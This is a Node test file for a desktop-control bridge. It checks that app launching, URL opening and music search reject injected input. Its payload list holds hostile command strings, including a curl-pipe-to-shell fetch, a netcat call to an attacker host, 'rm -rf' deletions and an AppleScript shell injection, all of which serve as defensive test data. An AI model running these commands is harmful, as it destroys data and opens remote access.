import { test } from 'node:test';
import assert from 'node:assert/strict';
import { dispatch, MAC, WINDOWS, VERBS, type BridgeDeps } from '../src/lib/server/desktop/verbs';
import { resolveApp } from '../src/lib/server/desktop/apps';
import { guard, type GuardInput } from '../src/lib/server/desktop/guard';
import { cocoaToCarbon, pickTarget, spokenDisplay, type Display } from '../src/lib/server/desktop/displays';
import { translateMacError } from '../src/lib/server/desktop/permissions';

const APPS = [
  { name: 'Safari', path: '/Applications/Safari.app' },
  { name: 'Google Chrome', path: '/Applications/Google Chrome.app' },
  { name: 'Spotify', path: '/Applications/Spotify.app' },
  { name: 'Visual Studio Code', path: '/Applications/Visual Studio Code.app' },
  { name: 'Notes', path: '/System/Applications/Notes.app' },
];

function spyDeps() {
  const calls: { file: string; args: readonly string[] }[] = [];
  const deps: BridgeDeps = {
    platform: 'darwin',
    run: async (file, args) => {
      calls.push({ file, args });
      return { stdout: '', stderr: '' };
    },
    launch: (file, args) => void calls.push({ file, args }),
    scanApps: async () => APPS,
    exists: () => false,
    env: {} as NodeJS.ProcessEnv,
    sleep: async () => {},
  };
  return { deps, calls };
}

test('injected command strings resolve to "no such application" and never execute', async () => {
  const payloads = [
    'Safari; rm -rf ~',
    'Safari && curl evil.sh | sh',
    '$(rm -rf /)',
    '`whoami`',
    'Spotify | nc attacker 4444',
    '"; do shell script "rm -rf ~" --',
    '../../../../bin/sh',
    '/bin/sh -c id',
  ];
  for (const name of payloads) {
    const { deps, calls } = spyDeps();
    const r = await dispatch('launch_app', { name }, deps);
    assert.equal(r.ok, false, name);
    assert.equal(r.status, 404, name);
    assert.match(r.message, /No such application/, name);
    assert.equal(calls.length, 0, `nothing may run for ${name}`);
  }
});

test('a real app resolves to its scanned bundle path, passed as one argv item', async () => {
  const { deps, calls } = spyDeps();
  const r = await dispatch('launch_app', { name: 'chrome' }, deps);
  assert.equal(r.ok, true);
  assert.deepEqual(calls[0], { file: 'open', args: ['-a', '/Applications/Google Chrome.app'] });
});

test('quit resolves against the scan too, and AppleScript data travels in argv', async () => {
  const { deps, calls } = spyDeps();
  deps.run = async (file, args) => {
    calls.push({ file, args });
    return { stdout: args.includes('Spotify') && String(args[3]).includes('is running') ? 'true' : '', stderr: '' };
  };
  await dispatch('quit_app', { name: 'spotify' }, deps);
  const quit = calls.find((c) => String(c.args[3]).includes('to quit'));
  assert.ok(quit, 'quit script ran');
  assert.equal(quit!.file, 'osascript');
  assert.ok(!String(quit!.args[3]).includes('Spotify'), 'app name is not interpolated into the script');
  assert.equal(quit!.args[4], 'Spotify');
});

test('unknown verbs and destructive verbs do not exist', async () => {
  const { deps, calls } = spyDeps();
  for (const v of ['shutdown', 'restart', 'rm', 'delete_file', 'exec', 'shell', 'force_quit']) {
    const r = await dispatch(v, {}, deps);
    assert.equal(r.status, 400);
  }
  assert.equal(calls.length, 0);
  assert.deepEqual(Object.keys(MAC).sort(), [...VERBS].sort());
  assert.deepEqual(Object.keys(WINDOWS).sort(), [...VERBS].sort());
});

test('open_url refuses non-http schemes and embedded credentials', async () => {
  const { deps, calls } = spyDeps();
  for (const url of ['file:///etc/passwd', 'javascript:alert(1)', 'x-apple.systempreferences:', 'https://u:p@example.com']) {
    const r = await dispatch('open_url', { url }, deps);
    assert.equal(r.status, 422, url);
  }
  assert.equal(calls.length, 0);
});

test('resolveApp ranking', () => {
  assert.equal(resolveApp('safari', APPS)?.name, 'Safari');
  assert.equal(resolveApp('vs code', APPS)?.name, 'Visual Studio Code');
  assert.equal(resolveApp('vsc', APPS)?.name, 'Visual Studio Code');
  assert.equal(resolveApp('photoshop', APPS), null);
  assert.equal(resolveApp('a', APPS), null);
});

const base: GuardInput = {
  method: 'POST',
  host: 'localhost:3000',
  origin: 'http://localhost:3000',
  secFetchSite: 'same-origin',
  bridgeHeader: '1',
  platform: 'darwin',
  enabled: true,
};

test('guard: loopback, same-origin, flag, platform', () => {
  assert.deepEqual(guard(base), { ok: true });
  assert.equal((guard({ ...base, host: '192.168.1.5:3000', origin: 'http://192.168.1.5:3000' }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, host: 'evil.com', origin: 'http://evil.com' }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, origin: 'http://evil.com', secFetchSite: 'cross-site' }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, origin: 'http://localhost:4000', secFetchSite: null }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, origin: null }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, bridgeHeader: null }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, enabled: false }) as { status: number }).status, 403);
  assert.equal((guard({ ...base, platform: 'linux' }) as { status: number }).status, 501);
  assert.deepEqual(guard({ ...base, platform: 'win32' }), { ok: true });
  assert.deepEqual(guard({ ...base, host: '127.0.0.1:3000', origin: 'http://127.0.0.1:3000' }), { ok: true });
  assert.deepEqual(guard({ ...base, host: '[::1]:3000', origin: 'http://[::1]:3000' }), { ok: true });
});

test('Cocoa → Carbon coordinates', () => {
  // primary 1512x982 laptop; external 3440x1440 to the right, top-aligned
  assert.deepEqual(cocoaToCarbon({ x: 0, y: 0, w: 1512, h: 982 }, 982), [0, 0, 1512, 982]);
  assert.deepEqual(cocoaToCarbon({ x: 1512, y: -458, w: 3440, h: 1440 }, 982), [1512, 0, 4952, 1440]);
  // external above the laptop
  assert.deepEqual(cocoaToCarbon({ x: 0, y: 982, w: 2560, h: 1440 }, 982), [0, -1440, 2560, 0]);
});

test('display targeting and naming', () => {
  const ds: Display[] = [
    { name: 'Built-in Retina Display', main: true, builtIn: true, frame: { x: 0, y: 0, w: 1512, h: 982 }, visible: { x: 0, y: 0, w: 1512, h: 950 } },
    { name: 'LG ULTRAWIDE', main: false, builtIn: false, frame: { x: 1512, y: 0, w: 3440, h: 1440 }, visible: { x: 1512, y: 0, w: 3440, h: 1415 } },
  ];
  assert.equal(pickTarget(ds, 'secondary')?.name, 'LG ULTRAWIDE');
  assert.equal(spokenDisplay(pickTarget(ds, 'secondary')!), 'on your LG ULTRAWIDE');
  assert.equal(spokenDisplay(pickTarget(ds, 'laptop')!), 'on your laptop');
});

test('permission errors name the exact setting and the terminal', () => {
  const env = { TERM_PROGRAM: 'iTerm.app' } as unknown as NodeJS.ProcessEnv;
  const sr = translateMacError('screencapture: could not create image from display', { verb: 'screenshot' }, env);
  assert.match(sr.message, /Screen Recording/);
  assert.match(sr.message, /iTerm/);
  const au = translateMacError('execution error: Not authorized to send Apple events to Spotify. (-1743)', { verb: 'media', app: 'Spotify' }, env);
  assert.match(au.message, /Automation/);
  assert.match(au.message, /Spotify/);
});

test('play_search: fixed hosts, the query only ever as encoded data', async () => {
  const { musicSearchUrl, playerName } = await import('../src/lib/music');
  const { PARSERS } = await import('../src/lib/server/desktop/common');
  const u = new URL(musicSearchUrl('apple_music', 'x" & calc.exe //evil.example?'));
  assert.equal(u.host, 'music.apple.com');
  assert.equal(u.searchParams.get('term'), 'x" & calc.exe //evil.example?');
  assert.equal(new URL(musicSearchUrl('spotify', '../../../account')).pathname, '/search/..%2F..%2F..%2Faccount');
  assert.throws(() => PARSERS.play_search({ service: 'evilcorp', query: 'x' }));
  assert.throws(() => PARSERS.play_search({ service: 'spotify', query: '' }));
  assert.equal(PARSERS.play_search({ query: 'a\nb\u0000c' }).query, 'a b c');
  assert.equal(playerName('AppleInc.AppleMusicWin_nzyj5cx40ttqa!App'), 'Apple Music');
  assert.equal(playerName('Spotify.exe'), 'Spotify');
  assert.equal(playerName('MSEdge'), 'Edge');
  assert.equal(playerName('Microsoft.ZuneMusic_8wekyb3d8bbwe!Microsoft.ZuneMusic'), 'Media Player');
});
